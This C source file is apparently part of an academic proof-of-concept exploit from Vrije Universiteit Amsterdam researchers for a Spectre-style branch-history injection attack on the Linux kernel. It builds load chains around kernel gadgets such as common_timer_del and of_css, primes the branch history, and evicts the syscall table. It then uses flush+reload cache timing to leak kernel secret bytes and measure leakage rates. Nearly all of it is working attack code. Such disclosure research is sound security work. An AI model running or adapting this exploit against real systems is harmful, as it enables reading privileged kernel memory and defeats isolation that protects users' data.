/*
 * Friday, October 27th 2023
 *
 * Sander Wiebing - s.j.wiebing@vu.nl
 * Alvise de Faveri Tron - a.de.faveri.tron@vu.nl
 * Herbert Bos - herbertb@cs.vu.nl
 * Cristiano Giuffrida - giuffrida@cs.vu.nl
 *
 * Vrije Universiteit Amsterdam - Amsterdam, The Netherlands
 *
 */

#include <stdio.h>
#include <time.h>
#include <signal.h>
#include <errno.h>
#include <stdlib.h>
#include <unistd.h>
#include <string.h>
#include <sys/syscall.h>
#include <sys/time.h>


#include "flush_and_reload.h"
#include "targets.h"
#include "../../poc-common/l2_eviction/evict_sys_table_l2.h"
#include "../../poc-common/common.h"

extern void fill_bhb(uint8_t *history, uint64_t syscall_nr,
                     uint64_t arg1, uint64_t arg2, uint64_t arg3, uint64_t arg4);


extern uint64_t static_fill_bhb_call(void * target,
                     uint64_t arg1, uint64_t arg2, uint64_t arg3, uint64_t arg4);


timer_t __always_inline create_timer()
{

    timer_t timer_id = 0;
    struct sigevent sev = { 0 };

    sev.sigev_notify = SIGEV_THREAD;

    int ret = timer_create(CLOCK_REALTIME, &sev, &timer_id);


    if (ret != 0){
        fprintf(stderr, "Error timer_create: %s\n", strerror(errno));
        exit(-1);
    }

    return timer_id;

}

void trigger_common_timer_del(timer_t timer_id)
{
    int ret = timer_delete(timer_id);
    if (ret != 0){
        fprintf(stderr, "Error timer_delete: %s\n", strerror(errno));
        exit(-1);
    }

}

// ----------------------------------------------------------------------------
// Load chain setup functions
//
// ----------------------------------------------------------------------------


void set_load_chain_simple_touch(struct config * cfg, int number_of_loads) {

    memset(cfg->ind_map, 0, 0x100);
    cfg->tfp_arg = 0;
    cfg->gadget_arg = 0;
    *cfg->fr_buf  = 0;


    switch (number_of_loads)
    {

    case 1:

        cfg->tfp_arg = cfg->ind_map_kern - 0x50;
        *(uint64_t *)(cfg->ind_map + 0x18) = (uint64_t)cfg->tfp_leak_target;

        cfg->gadget_arg = cfg->fr_buf_kern - 0x8;
        break;

    case 2:

        // For some reason this signal is very weak on some targets,
        // so we have it for case 2 instead
        cfg->tfp_arg = cfg->fr_buf_kern - 0x68;
        *(uint64_t *) cfg->fr_buf = (uint64_t)cfg->tfp_leak_target;

        break;

    case 3:
        cfg->tfp_arg = cfg->ind_map_kern - 0x50;
        *(uint64_t *)(cfg->ind_map + 0x18) = (uint64_t)cfg->tfp_leak_target;

        cfg->gadget_arg = cfg->ind_map_kern;

        *(uint64_t *)(cfg->ind_map + 0x8) = (uint64_t)cfg->fr_buf_kern - 0x60;

        // not used
        *(uint64_t *)(cfg->ind_map + 0x60) = (uint64_t)cfg->ind_map_kern;

        break;


    default:
        assert(0);
        break;
    }

    // ------------------------------------------------------------------------

}

void set_load_chain_leak_secret(struct config * cfg)
{
    // ------------------------------------------------------------------------
    // common_timer_del
    //   endbr64
    //   nop    DWORD PTR [rax+rax*1+0x0]
    //   push   rbp
    //   mov    rax,QWORD PTR [rdi+0x28]
    //   mov    QWORD PTR [rdi+0x58],0x0
    //   mov    rbp,rsp
    //   push   rbx
    //   mov    rbx,rdi
    //   mov    rax,QWORD PTR [rax+0x68]
    //   call   rax


    // ------------------------------------------------------------------------
    // of_css
    //    endbr64
    //    nop    DWORD PTR [rax+rax*1+0x0]
    //    mov    rax,QWORD PTR [rdi]
    //    push   rbp
    //    mov    rcx,QWORD PTR [rax+0x8]
    //    mov    rax,QWORD PTR [rax+0x60]
    //    mov    rbp,rsp
    //    mov    rdx,QWORD PTR [rax+0x58]
    //    mov    rax,QWORD PTR [rcx+0x60]
    //    test   rdx,rdx
    //    je     0xffffffff9b7c9aa4
    //    movsxd rdx,DWORD PTR [rdx+0x9c]
    //    add    rdx,0x44
    //    mov    rax,QWORD PTR [rax+rdx*8]

    memset(cfg->ind_map, 0, 0x100);

    cfg->tfp_arg = cfg->ind_map_kern - 0x50;
    *(uint64_t *)(cfg->ind_map + 0x18) = (uint64_t)cfg->tfp_leak_target;

    cfg->gadget_arg = cfg->ind_map_kern - 0x8;


    *(uint64_t *)(cfg->ind_map + 0x58) = (uint64_t)cfg->ind_map_kern - 0x10;
    *(uint64_t *)(cfg->ind_map + 0x0) = (uint64_t)cfg->ind_map_kern - 0x10;


    cfg->ind_tb_addr = (uint64_t * ) (cfg->ind_map + 0x50);
    cfg->ind_secret_addr = (uint64_t * ) (cfg->ind_map + 0x48);

    *cfg->ind_tb_addr = (uint64_t)cfg->fr_buf_kern - TB_OFFSET;

}

// ----------------------------------------------------------------------------
// Leak helper functions
//
// ----------------------------------------------------------------------------

uint64_t do_flush_and_reload(struct config * cfg, uint64_t iterations, uint8_t ret_on_hit) {


    uint64_t hits = 0;


    *(volatile uint64_t *)cfg->ind_map;
    *(volatile uint64_t *)(cfg->ind_map + 0x40);


    for(int i=0; i < iterations; i++) {


        asm volatile("clflush (%0)\n"::"r"(cfg->reload_addr));


        asm volatile("prefetcht0 (%0)" :: "r" (cfg->ind_map_kern));
        asm volatile("prefetcht0 (%0)" :: "r" (cfg->fr_buf_kern));
        asm volatile("prefetcht0 (%0)" :: "r" (cfg->tfp_arg));

        if (cfg->ind_secret_addr) {
            asm volatile("prefetcht0 (%0)" :: "r" ((*cfg->ind_secret_addr) - TS_OFFSET));
        }

        asm volatile("sfence\n");


        //ensure target is in the btb
        timer_t timer_id = create_timer();
        static_fill_bhb_call(trigger_common_timer_del, (uint64_t) timer_id, 0, 0, 0);
        timer_id = create_timer();
        static_fill_bhb_call(trigger_common_timer_del, (uint64_t) timer_id, 0, 0, 0);

        cpuid();
        evict_sys_call_table();

        fill_bhb(cfg->history, VICTIM_SYSCALL, (uint64_t)cfg->tfp_arg, (uint64_t) cfg->gadget_arg , 0, 0);


        cpuid();


        if(load_time(cfg->reload_addr) < THR) {
            if (ret_on_hit) {
                return 1;
            } else {
                hits++;
            }
        }
    }

    return hits;


}

int leak_byte_forwards(struct config * cfg, uint64_t prefix) {

    uint64_t fr_offset, hits;
    uint64_t prefix_offset = (prefix * STRIDE);

    cfg->reload_addr = cfg->fr_buf;

    for (size_t outer = 0; outer < 10; outer++)
    {
        for (uint64_t byte = 0; byte <= 0xff; byte++) {


            fr_offset = (byte << 24);
            if (byte & (1 << 7)) {
                fr_offset |= 0xffffffff00000000;
            }

            fr_offset = fr_offset * STRIDE;

            *cfg->ind_tb_addr = (uint64_t) (cfg->fr_buf_kern - fr_offset - TB_OFFSET - prefix_offset);

            hits = do_flush_and_reload(cfg, 1, 1);

            if (hits > 0) {
                return (int) byte;
            }
        }

    }

    return -1;

}


// ----------------------------------------------------------------------------
// Leak test functions
//
// ----------------------------------------------------------------------------


uint64_t test_leakage_rate(struct config * cfg, uint8_t byte_to_test, uint64_t iterations) {

    uint64_t hits, fr_offset, prefix, prefix_offset, zero_extend;

    set_load_chain_leak_secret(cfg);

    cfg->reload_addr = cfg->fr_buf;
    uint8_t *secret = cfg->ind_map + 0x2000;
    uint8_t *secret_kern = cfg->ind_map_kern + 0x2000;
    *cfg->ind_secret_addr = (uint64_t) secret_kern - TS_OFFSET;

    memset(secret, 0x0, 4);
    uint8_t leaked_bytes[4] = {0};

    leaked_bytes[0] = 0xe;
    secret[0] = 0xe;

    secret[3] = byte_to_test;

    prefix = *(uint32_t *) (leaked_bytes);

    if (byte_to_test & (1 << 7)) {
        prefix |= 0xffffffff00000000;
    }
    prefix_offset = (prefix * STRIDE);


    fr_offset = (((uint64_t) byte_to_test) << 24) * STRIDE;
    *cfg->ind_tb_addr = (uint64_t) (cfg->fr_buf_kern - fr_offset - TB_OFFSET - prefix_offset);


    // now leak

    hits = do_flush_and_reload(cfg, iterations, 0);

    return hits;

}


#define NLOADS 3
void print_leakage_rate(struct config * cfg, uint64_t iterations) {

    uint64_t hits = 0;
    cfg->reload_addr = cfg->fr_buf;

    printf("%-14s| %-14s| %-14s| %-14s|\n", "CHAIN + 2 LDS", "2 LDS",
                    "CHAIN + 3 LDS", "SECRET TRANS.");


    for (size_t iter = 0; iter < 4; iter++)
    {

        for (int l = 0; l < NLOADS; l++)
        {
            set_load_chain_simple_touch(cfg, l + 1);

            hits = do_flush_and_reload(cfg, iterations, 0);

            printf("%5ld %6.2f%% | ", hits, ((float) hits / iterations) * 100);
            fflush(stdout);

        }

        set_load_chain_leak_secret(cfg);

        hits = test_leakage_rate(cfg, 0xfe, iterations);

        printf("%5ld %6.2f%% | ", hits, ((float) hits / iterations) * 100);
        printf("\n");

    }

}

